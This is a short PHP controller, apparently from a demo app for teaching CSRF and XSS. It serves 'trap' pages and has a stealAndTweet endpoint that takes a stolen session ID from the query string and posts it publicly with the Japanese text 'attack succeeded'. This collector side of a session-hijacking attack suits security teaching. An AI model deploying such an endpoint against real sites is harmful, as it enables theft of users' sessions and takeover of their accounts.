<?php

namespace App\Controller\Trap;

use App\Model\Tweet;
use App\System\Classes\Controller;
use App\System\Interfaces\HTTP\RequestInterface;

class TrapController extends Controller
{
    public function csrf()
    {
        return $this->render('trap/csrf');
    }

    public function csrfAndXss()
    {
        return $this->render('trap/csrf-xss');
    }

    public function stealAndTweet(RequestInterface $request)
    {
        $sid = $request->getGet('sid');

        //セッションIDを投稿して暴露
        $tweet = new Tweet();
        $tweet->smartInsert([
            'user_id' => 2,
            'text' => "攻撃成功!\n↓この人のセッションIDは{$sid}です。",
        ]);

        return redirect('/all');
    }
}